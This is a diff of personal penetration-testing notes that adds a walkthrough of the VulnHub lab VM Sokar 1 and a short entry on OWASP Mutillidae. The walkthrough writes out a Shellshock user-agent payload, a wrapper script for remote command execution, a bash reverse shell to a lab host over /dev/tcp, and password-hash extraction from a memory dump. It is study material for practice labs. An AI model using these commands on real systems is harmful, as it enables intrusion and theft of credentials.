@@ -135,7 +135,102 @@ Simple vuln that only requires telnet
 > telnet 192.168.56.102 1524
 that is it, should now have a root shell
 
-* Lecture
-* Tutorial
-* Books
+** Sokar 1
+VulnHub: [[https://www.vulnhub.com/?q%3Dsokar&sort%3Ddate-asc&type%3Dvm][Sokar 1]]
+*** HackHappy Walkthrough
++ Enumeration
+- netdiscover to find the server
+
+- nmap on the server
+#+BEGIN_SRC sh
+nmap -sV -p- 192.168.56.102
+#+END_SRC
+This found an open port on 591
+
+- http://192.168.56.102:591 - this takes you to a stats page
+  
+- gobuster is then used for more info
+#+BEGIN_SRC sh
+gobuster -w /usr/share/wordlists/dirb/All.txt -u http://192.168.56.102:591 -t 50
+#+END_SRC
+-t is number of threads
+
+- nikto
+#+BEGIN_SRC sh
+nikto -h http://192.168.56.102:591
+#+END_SRC
+
+- found a /cgi-bin
+- this confirms that the script is regualrly  updating, and confirms that it's the server output
+  - this indicates a cron job
+    
+- attempt [[file://home/crito/org/tech/security/exploits/shellshock.org][Shellshock]]
+#+BEGIN_SRC sh
+curl -H "user-agent: () {:;}; echo; echo; /bin/bash -c 'id;;" http://192.168.56.102:591/cgi-bin/cat
+#+END_SRC
+this indicates that shell shock works and we can execute cmds as apache
+
+- create a script with the above for convenience
+c.sh
+#+BEGIN_SRC sh
+#! /bin/bash
+curl -H "user-agent: () {:;}; echo; echo; /bin/bash -c '$1 $2 $3 $4 $5;'" http://192.168.56.102:591/cgi-bin/cat
+#+END_SRC
+- ./c.sh id
+  - this will now perform the id cmd on the server
+    
+- viewing the home directories a user called bynarr has it set to 777
+  - in the bash_profile this PATH=.:$PATH:$HOME/bin
+    - the . in the PATH means that cmds can be executed from the home dir without the ./
+
+- create a reverse shell from bynarr's home directory
+  - on host
+#+BEGIN_SRC sh
+nc -l -p 51242
+#+END_SRC
+  - using the script from before
+#+BEGIN_SRC sh
+./c.sh '/bin/echo -e "bash -i >& /dev/tcp/192.168.56.101/51242 0>&1" > /home/bynarr/iostat'
+#+END_SRC
+  
+- with the new shell check for sudo privs
+#+BEGIN_SRC sh
+sudo -l
+#+END_SRC
+
+- this indicates that we can use the script /home/bynarr/lime
+  - this is a linux memory extractor
+  - when run, and add is used it prints a file to the /tmp
+    
+- use grep, looking for root
+#+BEGIN_SRC sh
+grep root ram
+#+END_SRC
+this found the hash for the root acct
+
+- also there was the other two accts hashes available in the file
+  - apophis - was cracked to be overdrive
+    
+- as the reverse shell isn't a tty we can use
+#+BEGIN_SRC sh
+python -c 'import pty; pty.spawn("/bin/sh")'
+#+END_SRC
+will now be able to use su and become apophis
+
+- inside of apophis is a file build.
+  - then run it indicates that it tries but fails to connect to a repo
+  - indication of version control, git is running on the machine 
+    - looking at the version it appears there's a vuln
+
+- to take advantage of the vuln in git we need to inpersonate sokar-dev, the dev server that build tries to connect to
+  - walk through ended here as unable to edit /etc/hosts needed root priv
+    
+- I think that the .git file should have been looked for and edited the config to point to our host machine
+
+** Mutillidae
+** [[https://www.youtube.com/watch?v%3DCYsiNYeAS6U][Introduction to OWASP Mutillidae II Web Pen Testing Environment - Jeremy Druin]]
+- is contained in Metasploit2
+  
+- Besides "hints" and "bubble hints" there is a file with 1,000+ lines of pre-tested hacks against various pages
+  - <directory>/mutillidae/documentation/mutillidae-test-scripts.txt
 * Links
